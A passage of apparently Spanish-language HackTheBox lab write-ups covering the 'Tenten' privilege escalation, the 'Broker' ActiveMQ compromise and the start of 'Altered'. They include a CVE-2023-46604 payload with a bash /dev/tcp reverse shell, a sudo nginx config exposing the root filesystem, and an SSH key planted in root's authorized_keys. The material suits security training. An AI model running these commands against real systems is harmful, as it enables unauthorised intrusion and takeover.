To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
See "man sudo_root" for details.

takis@tenten:~$ export TERM=xterm
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@tenten:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
2147f10efc4677c6e852f9a0b765e848
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>
    <p>Podemos ejecutar sin proporcionar contraseña <code class="language-plaintext highlighter-rouge">/bin/fuckin</code> como root.</p>
  </li>
  <li>
    <p>Este es su contenido.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@tenten:~<span class="nv">$ </span>file /bin/fuckin
/bin/fuckin: Bourne-Again shell script, ASCII text executable
takis@tenten:~<span class="nv">$ </span><span class="nb">cat</span> /bin/fuckin
<span class="c">#!/bin/bash</span>
<span class="nv">$1</span> <span class="nv">$2</span> <span class="nv">$3</span> <span class="nv">$4</span>
</code></pre></div></div>

<ul>
  <li>Si le concatenamos un comando lo ejecuta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@tenten:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/fuckin <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<ul>
  <li>Vamos a ejecutar una bash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@tenten:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/fuckin /bin/bash
root@tenten:~# <span class="nb">whoami
</span>root
root@tenten:~# <span class="nb">cat</span> /root/root.txt 
d2fbb02fd8fa5e734ecbc1ca8cedf07e
root@tenten:~# 
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Broker (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/10/27/broker.html" rel="alternate" type="text/html" title="HackTheBox - Broker (easy)" /><published>2024-10-27T00:00:00-06:00</published><updated>2024-10-27T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/10/27/broker</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/10/27/broker.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/a725533911ba94a880899fbf900d988c.png" />
</p>

<ul>
  <li>Broker is an easy difficulty <code class="language-plaintext highlighter-rouge">Linux</code> machine hosting a version of <code class="language-plaintext highlighter-rouge">Apache ActiveMQ</code>. Enumerating the version of <code class="language-plaintext highlighter-rouge">Apache ActiveMQ</code> shows that it is vulnerable to <code class="language-plaintext highlighter-rouge">Unauthenticated Remote Code Execution</code>, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a <code class="language-plaintext highlighter-rouge">sudo</code> misconfiguration allowing the <code class="language-plaintext highlighter-rouge">activemq</code> user to execute <code class="language-plaintext highlighter-rouge">sudo /usr/sbin/nginx</code>, which is similar to the recent <code class="language-plaintext highlighter-rouge">Zimbra</code> disclosure and is leveraged to gain <code class="language-plaintext highlighter-rouge">root</code> access.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,1883,5672,8161,37891,61613,61614,61616 10.10.11.243 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-10-24 18:55 CST
Nmap scan report <span class="k">for </span>10.10.11.243
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

Bug <span class="k">in </span>mqtt-subscribe: no string output.
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http       nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-auth: 
| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
|_  basic <span class="nv">realm</span><span class="o">=</span>ActiveMQRealm
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Error 401 Unauthorized
1883/tcp  open  mqtt
5672/tcp  open  amqp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
|_amqp-info: ERROR: AQMP:handshake expected header <span class="o">(</span>1<span class="o">)</span> frame, but was 65
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty<span class="o">(</span>9.4.39.v20210325<span class="o">)</span>
| http-auth: 
| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
|_  basic <span class="nv">realm</span><span class="o">=</span>ActiveMQRealm
37891/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand<span class="o">(</span>ProtocolConverter.java:258<span class="o">)</span>
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand<span class="o">(</span>StompTransportFilter.java:85<span class="o">)</span>
|     org.apache.activemq.transport.TransportSupport.doConsume<span class="o">(</span>TransportSupport.java:83<span class="o">)</span>
|     org.apache.activemq.transport.tcp.TcpTransport.doRun<span class="o">(</span>TcpTransport.java:233<span class="o">)</span>
|     org.apache.activemq.transport.tcp.TcpTransport.run<span class="o">(</span>TcpTransport.java:215<span class="o">)</span>
|_    java.lang.Thread.run<span class="o">(</span>Thread.java:750<span class="o">)</span>
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty<span class="o">(</span>9.4.39.v20210325<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title.
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
</span></code></pre></div></div>

<h2 id="deserialization-attack-cve-2023-46604"> Deserialization Attack (CVE-2023-46604)</h2>

<ul>
  <li>
    <p>Tenemos varios puertos abiertos los cuales corren el servicio <code class="language-plaintext highlighter-rouge">http</code> en la máquina vamos a enumerar primero el 80.</p>
  </li>
  <li>
    <p>Nos pide credenciales.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/broker/1.png" />
</p>

<ul>
  <li>Si probamos con <code class="language-plaintext highlighter-rouge">admin:admin</code> vemos que funcionan.</li>
</ul>

<p align="center"> 
<img src="/assets/hackthebox/img/machines/easy/broker/2.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/broker/3.png" />
</p>

<ul>
  <li>Aquí nos dan la versión.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/broker/4.png" />
</p>

<ul>
  <li>
    <p>Si investigamos encontramos una vulnerabilidad la cual nos otorga RCE <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46604">https://nvd.nist.gov/vuln/detail/CVE-2023-46604</a>.</p>
  </li>
  <li>
    <p>Aquí nos explican como funciona la vulnerabilidad <a href="https://github.com/evkl1d/CVE-2023-46604/tree/main">https://github.com/evkl1d/CVE-2023-46604/tree/main</a>.</p>
  </li>
  <li>
    <p>Vamos a clonarlos el proyecto para poder enviar el <code class="language-plaintext highlighter-rouge">XML</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/evkl1d/CVE-2023-46604
Cloning into <span class="s1">'CVE-2023-46604'</span>...
remote: Enumerating objects: 22, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>22/22<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>17/17<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 22 <span class="o">(</span>delta 5<span class="o">)</span>, reused 13 <span class="o">(</span>delta 3<span class="o">)</span>, pack-reused 0 <span class="o">(</span>from 0<span class="o">)</span>
Receiving objects: 100% <span class="o">(</span>22/22<span class="o">)</span>, 5.10 KiB | 746.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>5/5<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
❯ <span class="nb">cd </span>CVE-2023-46604
</code></pre></div></div>

<ul>
  <li>Vamos a editar el <code class="language-plaintext highlighter-rouge">xml</code> que envié el exploit para obtener la reverse shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>poc.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> ?&gt;
    &lt;beans <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.springframework.org/schema/beans"</span>
       xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
       xsi:schemaLocation<span class="o">=</span><span class="s2">"
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span><span class="o">&gt;</span>
        &lt;bean <span class="nb">id</span><span class="o">=</span><span class="s2">"pb"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"java.lang.ProcessBuilder"</span> init-method<span class="o">=</span><span class="s2">"start"</span><span class="o">&gt;</span>
            &lt;constructor-arg&gt;
            &lt;list&gt;
                &lt;value&gt;bash&lt;/value&gt;
                &lt;value&gt;-c&lt;/value&gt;
                &lt;value&gt;bash <span class="nt">-i</span> &amp;gt<span class="p">;</span>&amp;amp<span class="p">;</span> /dev/tcp/10.10.14.3/443 0&amp;gt<span class="p">;</span>&amp;amp<span class="p">;</span>1&lt;/value&gt;
            &lt;/list&gt;
            &lt;/constructor-arg&gt;
        &lt;/bean&gt;
    &lt;/beans&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>El script de Python3 nos automatiza el envió del <code class="language-plaintext highlighter-rouge">xml</code> en <code class="language-plaintext highlighter-rouge">ActiveMQ</code> que usa un entorno Spring y explota una vulnerabilidad de deserialización.</p>
  </li>
  <li>
    <p>Vamos a ponernos en escucha.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Iniciamos nuestro servidor en Python3.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ejecutamos el script.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 exploit.py <span class="nt">-i</span> 10.10.11.243 <span class="nt">-u</span> http://10.10.14.3/poc.xml
     _        _   _           __  __  ___        ____   ____ _____ 
    / <span class="se">\ </span>  ___| |_<span class="o">(</span>_<span class="o">)</span>_   _____|  <span class="se">\/</span>  |/ _ <span class="se">\ </span>     |  _ <span class="se">\ </span>/ ___| ____|
   / _ <span class="se">\ </span>/ __| __| <span class="se">\ \ </span>/ / _ <span class="se">\ </span>|<span class="se">\/</span>| | | | |_____| |_<span class="o">)</span> | |   |  _|  
  / ___ <span class="se">\ </span><span class="o">(</span>__| |_| |<span class="se">\ </span>V /  __/ |  | | |_| |_____|  _ &lt;| |___| |___ 
 /_/   <span class="se">\_\_</span>__|<span class="se">\_</span>_|_| <span class="se">\_</span>/ <span class="se">\_</span>__|_|  |_|<span class="se">\_</span>_<span class="se">\_\ </span>    |_| <span class="se">\_\\</span>____|_____|

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target: 10.10.11.243:61616
<span class="o">[</span><span class="k">*</span><span class="o">]</span> XML URL: http://10.10.14.3/poc.xml

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending packet: 0000006c1f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010019687474703a2f2f31302e31302e31342e332f706f632e786d6c
</code></pre></div></div>

<ul>
  <li>Llegan las peticiones.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.243 - - <span class="o">[</span>27/Oct/2024 11:40:55] <span class="s2">"GET /poc.xml HTTP/1.1"</span> 200 -
10.10.11.243 - - <span class="o">[</span>27/Oct/2024 11:40:56] <span class="s2">"GET /poc.xml HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Nos llega la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/opt/apache-activemq-5.15.15/bin<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script /dev/null <span class="nt">-c</span> bash
Script started, output log file is <span class="s1">'/dev/null'</span><span class="nb">.</span>
activemq@broker:/opt/apache-activemq-5.15.15/bin<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 443
                                                                                                
❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 443
                              reset xterm
&lt;ENTER&gt;
activemq@broker:/opt/apache-activemq-5.15.15/bin<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
54339dbd39d73ad7935a3666c77837c1
activemq@broker:~<span class="nv">$ </span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>
    <p>Podemos ejecutar como <code class="language-plaintext highlighter-rouge">root</code>  <code class="language-plaintext highlighter-rouge">nginx</code> sin proporcionar contraseña <a href="https://kinsta.com/es/base-de-conocimiento/que-es-nginx/">https://kinsta.com/es/base-de-conocimiento/que-es-nginx/</a>.</p>
  </li>
  <li>
    <p>Vemos que podemos proporcionar un archivo de configuración para correr una web.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:~<span class="nv">$ </span><span class="nb">sudo </span>nginx <span class="nt">-h</span>
nginx version: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Usage: nginx <span class="o">[</span>-?hvVtTq] <span class="o">[</span><span class="nt">-s</span> signal] <span class="o">[</span><span class="nt">-c</span> filename] <span class="o">[</span><span class="nt">-p</span> prefix] <span class="o">[</span><span class="nt">-g</span> directives]

Options:
  -?,-h         : this <span class="nb">help</span>
  <span class="nt">-v</span>            : show version and <span class="nb">exit</span>
  <span class="nt">-V</span>            : show version and configure options <span class="k">then </span><span class="nb">exit</span>
  <span class="nt">-t</span>            : <span class="nb">test </span>configuration and <span class="nb">exit</span>
  <span class="nt">-T</span>            : <span class="nb">test </span>configuration, dump it and <span class="nb">exit</span>
  <span class="nt">-q</span>            : suppress non-error messages during configuration testing
  <span class="nt">-s</span> signal     : send signal to a master process: stop, quit, reopen, reload
  <span class="nt">-p</span> prefix     : <span class="nb">set </span>prefix path <span class="o">(</span>default: /usr/share/nginx/<span class="o">)</span>
  <span class="nt">-c</span> filename   : <span class="nb">set </span>configuration file <span class="o">(</span>default: /etc/nginx/nginx.conf<span class="o">)</span>
  <span class="nt">-g</span> directives : <span class="nb">set </span>global directives out of configuration file

activemq@broker:~<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Vamos a crear el <code class="language-plaintext highlighter-rouge">.conf</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/tmp<span class="nv">$ </span><span class="nb">cp</span> /etc/nginx/nginx.conf /tmp
activemq@broker:/tmp<span class="nv">$ </span><span class="nb">cd</span> /tmp
</code></pre></div></div>

<ul>
  <li>Editamos el <code class="language-plaintext highlighter-rouge">.conf</code> para poder tener privilegios de <code class="language-plaintext highlighter-rouge">directory listing</code> y crear el servicio para poder ver todo desde el directorio <code class="language-plaintext highlighter-rouge">/</code> de <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/tmp<span class="nv">$ </span><span class="nb">cat </span>nginx.conf 
user root<span class="p">;</span>

events <span class="o">{</span>
	worker_connections 768<span class="p">;</span>
	<span class="c"># multi_accept on;</span>
<span class="o">}</span>

http <span class="o">{</span>
	server <span class="o">{</span>
		listen     1234<span class="p">;</span>
		root /<span class="p">;</span>
		autoindex on<span class="p">;</span>
	<span class="o">}</span>
<span class="o">}</span>
activemq@broker:/tmp<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/tmp<span class="nv">$ </span><span class="nb">sudo </span>nginx <span class="nt">-c</span> /tmp/nginx.conf 
</code></pre></div></div>

<ul>
  <li>Lo vemos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/broker/5.png" />
</p>

<ul>
  <li>Ya podemos ver la flag de root.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/broker/6.png" />
</p>

<ul>
  <li>Algo que podemos hacer para conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> podemos poner el método <code class="language-plaintext highlighter-rouge">PUT</code> para subir la <code class="language-plaintext highlighter-rouge">id_rsa</code> ya que el usuario <code class="language-plaintext highlighter-rouge">root</code> cuenta con el directorio .<code class="language-plaintext highlighter-rouge">ssh</code> solamente tenemos que cambiar el puerto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/tmp<span class="nv">$ </span><span class="nb">cat </span>nginx.conf 
user root<span class="p">;</span>

events <span class="o">{</span>
	worker_connections 768<span class="p">;</span>
	<span class="c"># multi_accept on;</span>
<span class="o">}</span>

http <span class="o">{</span>
	server <span class="o">{</span>
		listen     1237<span class="p">;</span>
		root /<span class="p">;</span>
		autoindex on<span class="p">;</span>
		dav_methods PUT<span class="p">;</span>
	<span class="o">}</span>
<span class="o">}</span>
activemq@broker:/tmp<span class="nv">$ </span><span class="nb">sudo </span>nginx <span class="nt">-c</span> /tmp/nginx.conf
activemq@broker:/tmp<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Creamos las claves.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh-keygen
Generating public/private ed25519 key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/miguelrega7/.ssh/id_ed25519<span class="o">)</span>: 
/home/miguelrega7/.ssh/id_ed25519 already exists.
Overwrite <span class="o">(</span>y/n<span class="o">)</span>? 
</code></pre></div></div>

<ul>
  <li>Ahora la subimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/tmp<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> PUT http://10.10.11.243:1237/root/.ssh/authorized_keys <span class="nt">-d</span> <span class="s1">'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPVJvICHwt32MJceMIYuxo4dMlOYxtQsUOAmQl2mMqhj miguelrega7@miguelito'</span>
</code></pre></div></div>

<ul>
  <li>Ahora nos podemos conectar con <code class="language-plaintext highlighter-rouge">SSH</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh root@10.10.11.243
Welcome to Ubuntu 22.04.3 LTS <span class="o">(</span>GNU/Linux 5.15.0-88-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 27 06:36:46 PM UTC 2024

  System load:           0.0
  Usage of /:            70.8% of 4.63GB
  Memory usage:          10%
  Swap usage:            0%
  Processes:             161
  Users logged <span class="k">in</span>:       0
  IPv4 address <span class="k">for </span>eth0: 10.10.11.243
  IPv6 address <span class="k">for </span>eth0: dead:beef::250:56ff:fe94:afc9

 <span class="k">*</span> Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar <span class="k">for </span>easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance <span class="k">for </span>Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: <span class="nb">sudo </span>pro status


The list of available updates is more than a week old.
To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update

root@broker:~# <span class="nb">whoami
</span>root
root@broker:~# 
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Altered (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/10/20/altered.html" rel="alternate" type="text/html" title="HackTheBox - Altered (hard)" /><published>2024-10-20T00:00:00-06:00</published><updated>2024-10-20T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/10/20/altered</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/10/20/altered.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/a309dc491e50db28bf0f1ea691879b89.png" />
</p>

<ul>
  <li>Further enchance your skills by exploring related academy modules.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.159 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-10-13 16:48 CST
Nmap scan report <span class="k">for </span>10.10.11.159
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 <span class="o">(</span>RSA<span class="o">)</span>
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-title: UHC March Finals
|_Requested resource was http://10.10.11.159/login
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Tenemos 2 puertos abiertos el puerto 22 que corresponde al servicio <code class="language-plaintext highlighter-rouge">ssh</code> y el puerto 80 que corresponde a un servicio <code class="language-plaintext highlighter-rouge">http</code> el cual esta corriendo una pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span> <span class="p">[</span><span class="mi">302</span> <span class="no">Found</span><span class="p">]</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">XSRF</span><span class="o">-</span><span class="no">TOKEN</span><span class="p">,</span><span class="n">laravel_session</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="p">],</span> <span class="no">Laravel</span><span class="p">,</span> <span class="no">Meta</span><span class="o">-</span><span class="no">Refresh</span><span class="o">-</span><span class="no">Redirect</span><span class="p">[</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span><span class="p">],</span> <span class="no">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Redirecting</span> <span class="n">to</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span><span class="p">],</span> <span class="no">UncommonHeaders</span><span class="p">[</span><span class="n">x</span><span class="o">-</span><span class="n">content</span><span class="o">-</span><span class="n">type</span><span class="o">-</span><span class="n">options</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Frame</span><span class="o">-</span><span class="no">Options</span><span class="p">[</span><span class="no">SAMEORIGIN</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span><span class="p">]</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">XSRF</span><span class="o">-</span><span class="no">TOKEN</span><span class="p">,</span><span class="n">laravel_session</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">1.9</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Laravel</span><span class="p">,</span> <span class="no">PasswordField</span><span class="p">[</span><span class="n">password</span><span class="p">],</span> <span class="no">Script</span><span class="p">[</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">UHC</span> <span class="no">March</span> <span class="no">Finals</span><span class="p">],</span> <span class="no">UncommonHeaders</span><span class="p">[</span><span class="n">x</span><span class="o">-</span><span class="n">content</span><span class="o">-</span><span class="n">type</span><span class="o">-</span><span class="n">options</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Frame</span><span class="o">-</span><span 